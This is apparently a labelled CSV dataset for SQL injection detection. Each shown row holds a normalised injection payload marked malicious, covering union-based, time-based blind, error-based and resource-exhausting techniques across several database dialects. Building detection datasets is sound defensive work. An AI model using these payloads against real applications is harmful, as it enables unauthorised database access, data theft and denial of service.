row_index,payload_norm,label,sqli_type_hint
1020,"1%"" ) ) and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) and ( ( ""%"" = """,1,
1021,"1'+ ( select 'qrml' where 3791 = 3791 or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) ) +'",1,
1022,1' ) ) as eymg where 7000 = 7000,1,
1023,"1%' ) ) ) and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) and ( ( ( '%' = '",1,
1024,"1%"" ) ) ) or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",1,
1025,"-1065 ) ) union all select 7437,7437,7437,7437,7437,7437,7437,7437--",1,
1026,-1603' ) ) or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ( 'abmo' = 'abmo,1,
1027,"1', ( select ( case when ( 2106 = 2106 ) then ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) else 2106* ( select 2106 from master..sysdatabases ) end ) )",1,
1028,"1%"" and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",1,
1029,"1 where 7051 = 7051 or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,
1030,"1' ) where 6672 = 6672 union all select null,null,null,null,null,null,null,null,null,null--",1,
1031,-3899' ) where 8152 = 8152 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --,1,
1032,"1"" ) and ( 3020 = 3020 ) *6703 and ( ""hkjf"" = ""hkjf",1,
1033,"1%"" ) ) ) and 7533 = 7533 and ( ( ( ""%"" = """,1,
1034,"1%"" ) and ( 6016 = 4763 ) *4763 and ( ""%"" = """,1,
1035,"1"" ) ) ) or elt ( 5873 = 5873,sleep ( 5 ) ) #",1,
1036,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and ( ( ""%"" = """,1,
1037,"-3391' union all select 2024,2024--",1,
1038,"1%' or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and '%' = '",1,
1039,"-3829%"" ) union all select 2218,2218,2218,2218,2218,2218,2218--",1,
1040,"-8629 where 8049 = 8049 union all select 8049,8049,8049,8049,8049,8049,8049#",1,
1041,"-3279"" union all select 8568,8568,8568,8568--",1,
1042,"1"" or elt ( 6272 = 6272,sleep ( 5 ) )",1,
1043,"1%' ) ) ) and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",1,
1044,"1%' ) ) and elt ( 3114 = 3114,sleep ( 5 ) ) #",1,
1045,1' ) rlike sleep ( 5 ) #,1,
1046,-3598 ) union all select 2264#,1,
1047,select ( case when ( 9455 = 6007 ) then 9455 else 9455* ( select 9455 from mysql.db ) end ) #,1,
1048,"-8982' in boolean mode ) union all select 5367,5367,5367,5367,5367,5367#",1,
1049,1' ) and 9198 = 9198--,1,
